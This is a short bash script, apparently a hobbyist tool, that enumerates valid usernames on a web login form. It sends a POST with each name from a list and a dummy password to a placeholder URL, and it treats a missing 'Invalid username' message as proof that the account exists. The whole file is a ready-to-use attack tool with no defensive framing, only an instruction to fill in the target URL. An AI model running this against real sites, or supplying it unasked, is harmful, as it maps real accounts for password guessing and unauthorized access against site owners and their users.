#!/bin/bash

# Create by abdmah 2026

for i in $(cat users.txt)
do
	rep=$(curl -s -i -X POST 'https://YOURURL' --data "username=$i&password=vrzvzre") #change YOURURL by the good URL
	
	if echo "$rep" | grep -q 'Invalid username'; then
		echo $i "invalid user"
	else
		echo $i "good the user exist"
	fi
done


